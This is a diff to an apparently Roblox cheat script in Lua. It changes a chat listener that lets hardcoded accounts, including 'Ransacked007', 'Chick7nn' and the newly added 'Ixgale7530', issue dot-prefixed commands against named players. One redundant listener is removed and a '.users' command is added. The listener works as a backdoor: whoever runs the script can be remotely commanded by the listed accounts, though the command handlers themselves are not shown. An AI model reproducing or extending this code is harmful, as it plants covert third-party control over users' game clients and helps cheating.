@@ -544,34 +544,7 @@ getgenv().TextChatService.MessageReceived:Connect(function(message)
     local sender = message.TextSource.Name
     local text = message.Text
 
-    if sender == "L0CKED_1N1" or sender == "CHEATING_B0SS" or sender == "adorxfleurys" or sender == "Ransacked007" or sender == "" then
-        local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
-
-        if prefix and command then
-            local fullCommand = prefix .. command
-
-            playerName = playerName:match("^%s*(.-)%s*$")
-
-            if table.find(validCommands, fullCommand) then
-                if playerName and playerName ~= "" then
-                    handleCommand(fullCommand, playerName)
-                else
-                    warn("Player name is missing for command: " .. fullCommand)
-                end
-            else
-                warn("Unknown command: " .. fullCommand)
-            end
-        else
-            warn("Invalid message format: " .. text)
-        end
-    end
-end)
-
-getgenv().TextChatService.MessageReceived:Connect(function(message)
-    local sender = message.TextSource.Name
-    local text = message.Text
-
-    if sender == "Ransacked007" or sender == "Chick7nn" then
+    if sender == "Ransacked007" or sender == "Chick7nn" or sender == "Ixgale7530" then
         local prefix, command, playerName = string.match(text, "^(%.)(%w+)%s*(.*)")
 
         if prefix and command then
@@ -582,8 +555,10 @@ getgenv().TextChatService.MessageReceived:Connect(function(message)
             if table.find(admin_cmds, fullCommand) then
                 if playerName and playerName ~= "" then
                     handleCommand(fullCommand, playerName)
+                elseif command == ".users" then
+                    handleCommand(fullCommand)
                 else
-                    warn("Player name is missing for command: " .. fullCommand)
+                    warn("Player name missing for command: "..tostring(command))
                 end
             else
                 warn("Unknown command: " .. fullCommand)
